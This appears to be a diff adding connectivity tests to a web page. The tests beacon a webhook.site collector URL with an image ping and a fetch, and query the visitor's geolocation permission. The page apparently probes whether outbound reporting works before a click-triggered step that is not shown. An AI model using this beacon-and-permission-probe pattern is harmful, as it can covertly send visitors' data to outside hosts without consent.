@@ -22,6 +22,23 @@
 
     <script>
         const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
+        // Test 1: Simple Image Ping
+try {
+    const testImg = new Image();
+    testImg.onload = () => console.log("✅ Image Ping: SUCCESS");
+    testImg.onerror = (e) => console.log("❌ Image Ping: BLOCKED", e);
+    testImg.src = webhookURL + "?test=image_ping&t=" + Date.now();
+} catch(e) { console.log("❌ Image Object: CRASHED", e); }
+
+// Test 2: Fetch Ping
+fetch(webhookURL + "?test=fetch_ping", { mode: 'no-cors' })
+    .then(() => console.log("✅ Fetch Ping: SUCCESS"))
+    .catch((err) => console.log("❌ Fetch Ping: FAILED", err));
+
+// Test 3: Check Permissions
+navigator.permissions.query({name:'geolocation'}).then(res => {
+    console.log("📍 Geolocation Permission:", res.state);
+});
 
         // 2. THE CLICK TRIGGER
         window.onclick = () => {
